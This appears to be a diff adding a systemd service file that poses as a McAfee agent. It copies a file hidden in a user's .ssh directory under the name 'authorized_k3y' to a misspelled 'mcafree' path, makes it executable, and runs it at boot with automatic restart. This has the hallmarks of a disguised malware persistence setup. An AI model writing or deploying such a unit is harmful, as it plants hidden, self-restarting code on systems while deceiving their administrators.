@@ -1,0 +1,12 @@
+[Unit]
+Description=Mcafee agent
+
+[Service]
+Type=simple
+ExecStartPre=/bin/cp /home/sysadmin/.ssh/authorized_k3y /opt/McAfee/agent/mcafree
+ExecStartPre=/usr/bin/chmod +x /opt/McAfee/agent/mcafree
+ExecStart=/opt/McAfee/agent/mcafree
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
